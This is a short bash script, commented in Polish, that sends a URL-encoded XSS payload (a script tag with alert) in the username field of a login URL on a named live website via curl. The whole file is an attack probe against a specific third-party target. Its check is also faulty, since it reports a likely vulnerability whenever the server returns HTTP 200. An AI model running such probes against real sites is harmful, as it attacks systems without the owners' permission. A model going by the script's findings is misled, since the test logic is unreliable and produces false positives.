#!/bin/bash

# Cel testu
TARGET="https://kertu.org"
XSS_PAYLOAD="/Account/Login?username=%22%3Cscript%3Ealert('XSS')%3C/script%3E&password=test"
FULL_URL="$TARGET$XSS_PAYLOAD"

echo "Starting XSS vulnerability test..."
echo "Testing URL: $FULL_URL"

# Wykonanie żądania CURL
echo "Sending request to the server..."
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$FULL_URL")

# Analiza wyniku
echo "Analyzing server response..."
if [[ "$RESPONSE" == "200" ]]; then
  echo "The server returned HTTP 200. Potential XSS vulnerability detected. Check the application behavior manually to confirm."
else
  echo "The server returned HTTP code: $RESPONSE. XSS attack may be mitigated."
fi

echo "XSS vulnerability test completed."